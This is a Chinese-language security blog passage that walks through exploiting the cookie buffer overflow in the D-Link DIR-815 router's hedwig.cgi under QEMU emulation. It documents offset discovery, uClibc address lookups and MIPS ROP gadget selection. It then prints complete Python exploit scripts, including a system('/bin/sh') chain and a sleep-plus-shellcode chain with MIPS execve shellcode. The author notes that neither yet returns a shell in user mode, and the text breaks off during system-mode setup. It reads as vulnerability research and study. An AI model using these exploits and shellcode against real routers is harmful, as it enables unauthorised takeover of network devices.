<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
<p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/1043offset.png" alt=""></p>
<p>以上是触发第一个sprintf()的偏移。</p>
<h4 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>执行命令</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>调试之后发现确实能够触发第二个sprintf()。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf3.png" alt=""></p>
<p>并且覆盖了ra=68423668。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra2.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E5%81%8F%E7%A7%BB2.png" alt=""></p>
<p>计算得到偏移为1009。</p>
<h3 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
<p>1.定位system函数地址</p>
<p>首先需要先找到调用了哪个动态链接库libc.so，然后在libc.so中定位system函数。</p>
<p>通过以下过程：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0x409A54 #hedwigcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>为了以后不用每次都输入固定的指令可以编写一个dbgscript</p>
<pre class=" language-sh"><code class="language-sh">set architecture mips
set endian little
target remote :23957
b *0x409a54</code></pre>
<p>gdb-multiarch调试的时候执行<code>gdb-multiarch htdocs/cgibin -x dbgscript</code>，-x是指定要执行的命令文件。</p>
<p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc-so.png" alt=""></p>
<p>在/lib文件夹下找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/system.png" alt=""></p>
<p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
<p>2.绕过坏字符\x00构造rop链</p>
<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还到不了sprintf函数，前面的sess_get_uid函数只获取uid=之后\x00字符之前的字符串，进而导致缓冲区溢出失败。所以构造shellcode时需要对system函数的真实地址-1：0x7678b200-1=0x7678b1ff，再寻找gadget将其加1即可。</p>
<p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/jalrs0.png" alt=""></p>
<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addiu1.png" alt=""></p>
<p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%A6%86%E7%9B%96.png" alt=""></p>
<p>所以可以这样构造payload,结构大致如下：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E6%9E%84%E9%80%A0.png" alt=""></p>
<p>这里参考下H4lo师傅的整个流程图：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/H4lo.png" alt=""></p>
<p>3.构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>

padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin//sh'</span>

f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"exploit"</span><span class="token punctuation">,</span><span class="token string">'wb+'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>padding<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>4.测试exp</p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`</code></pre>
<p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget1.png" alt=""></p>
<p>之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addius5sp10.png" alt=""></p>
<p>进入system处，a0参数为/bin//sh。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system.png" alt=""></p>
<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，而当前$fp的内容为0x0空指针，(fp+0x10处)肯定无法访问。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system2.png" alt=""></p>
<p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
<h4 id="调用sleep-1-函数"><a href="#调用sleep-1-函数" class="headerlink" title="调用sleep(1)函数"></a>调用sleep(1)函数</h4><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。 </p>
<p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
<p>1.ROP Gadget 1</p>
<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/lia0.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x57E50.png" alt=""></p>
<p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
<p>2.ROP Gadget 2</p>
<p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-tail.png" alt=""></p>
<p>选择0x3B8A8作为gadget2。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/3B8A8.png" alt=""></p>
<p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
<p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_sleep.png" alt=""></p>
<p>3.ROP Gadget 3</p>
<p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-stackfinders.png" alt=""></p>
<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>，gadget3的作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/14F28.png" alt=""></p>
<p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
<p>4.ROP Gadget 4</p>
<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/movet9s1.png" alt=""></p>
<p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x1DD08.png" alt=""></p>
<p>到这里所有的gadget都找齐了。</p>
<p>5.构造exp</p>
<p>整个payload是这样的：</p>
<p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
<pre class=" language-python"><code class="language-python">libc_base <span class="token operator">=</span> <span class="token number">0x76738000</span>
sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span>

<span class="token comment" spellcheck="true"># Linux/MIPS - execve /bin/sh - 48 bytes</span>
shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># fisrt_ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
payload <span class="token operator">+=</span> shellcode</code></pre>
<p>调试结果显示能够进入到Shellcode去执行。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode.png" alt=""></p>
<p>但是之后一直出不去，获取不到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode2.png" alt=""></p>
<p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
<h1 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
<pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
./etc/services/HTTP/httpsvcs.php
./usr/sbin/httpc
./sbin/httpd</code></pre>
<p>查看httpcf.php</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
<span class="token shell-comment comment">#LogGMT On</span>
<span class="token shell-comment comment">#ErrorLog /dev/console</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/phyinf.php"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$hnap</span><span class="token punctuation">,</span> <span class="token variable">$widget</span><span class="token punctuation">,</span> <span class="token variable">$smart404</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/web"</span><span class="token punctuation">.</span>            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.php }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"LAN-1"</span><span class="token operator">||</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"WAN-1"</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { post_login.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>    
    <span class="token keyword">echo</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smart404</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">'       Control'</span><span class="token punctuation">.</span>                           <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       {'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Alias /smart404'</span><span class="token punctuation">.</span>               <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
